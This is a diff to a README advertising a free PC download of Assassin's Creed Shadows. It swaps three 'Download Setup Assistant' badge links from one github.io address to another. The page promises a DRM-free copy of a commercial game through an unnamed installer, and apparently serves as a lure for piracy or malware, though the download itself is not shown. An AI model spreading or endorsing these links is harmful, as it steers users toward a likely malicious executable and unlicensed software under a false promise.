@@ -1,6 +1,6 @@
 # Assassin’s Creed Shadows — Free PC Download 
 
-[![⬇ Download Setup Assistant](https://img.shields.io/badge/⏬%20Download-Setup_Assistant-blueviolet?style=for-the-badge&logo=windows&logoColor=white)](https://ryadikmntiiks.github.io/.github/ACS)
+[![⬇ Download Setup Assistant](https://img.shields.io/badge/⏬%20Download-Setup_Assistant-blueviolet?style=for-the-badge&logo=windows&logoColor=white)](https://assassins-creed-shadows-pc-download.github.io/.github)
 
 ## 🥷 About the Game
 
@@ -19,7 +19,7 @@ This assistant allows you to **install Assassin's Creed Shadows for free on PC**
 
 ---
 
-[![⬇ Download Setup Assistant](https://img.shields.io/badge/⏬%20Download-Setup_Assistant-blueviolet?style=for-the-badge&logo=windows&logoColor=white)](https://ryadikmntiiks.github.io/.github/ACS)
+[![⬇ Download Setup Assistant](https://img.shields.io/badge/⏬%20Download-Setup_Assistant-blueviolet?style=for-the-badge&logo=windows&logoColor=white)](https://assassins-creed-shadows-pc-download.github.io/.github)
 
 ---
 
@@ -41,7 +41,7 @@ This assistant allows you to **install Assassin's Creed Shadows for free on PC**
 - 🚫 No DRM, no launcher, no online dependencies  
 - 🖥 Full controller support and graphics optimization for PC
 
-[![⬇ Download Setup Assistant](https://img.shields.io/badge/⏬%20Download-Setup_Assistant-blueviolet?style=for-the-badge&logo=windows&logoColor=white)](https://ryadikmntiiks.github.io/.github/ACS)
+[![⬇ Download Setup Assistant](https://img.shields.io/badge/⏬%20Download-Setup_Assistant-blueviolet?style=for-the-badge&logo=windows&logoColor=white)](https://assassins-creed-shadows-pc-download.github.io/.github)
 
 ---
 
